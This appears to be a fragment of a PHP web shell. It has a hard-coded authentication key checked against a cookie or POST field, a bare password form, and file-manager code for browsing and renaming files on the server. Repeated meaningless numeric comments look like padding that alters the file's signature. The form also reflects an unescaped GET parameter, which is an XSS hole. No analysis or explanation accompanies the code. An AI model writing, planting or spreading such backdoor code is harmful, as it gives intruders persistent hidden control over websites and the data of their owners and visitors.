...
$auth_key = "868272cd3dc498a2802c414b636c0dae";
...
$pass = false;
if (isset($_COOKIE['pw_name_96136'])) {
    if(($_COOKIE['pw_name_96136']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_96136'])) {
        if(($_POST['pw_name_96136']) == $auth_key) {
            setcookie("pw_name_96136", $_POST['pw_name_96136']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_96136' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725996510578344 1725996510526454 1725996510160025 1725996510131932
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725996510578344 1725996510526454 1725996510160025 1725996510131932
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725996510578344 1725996510526454 1725996510160025 1725996510131932
            $name = PATH . "/" . $_GET['r'];
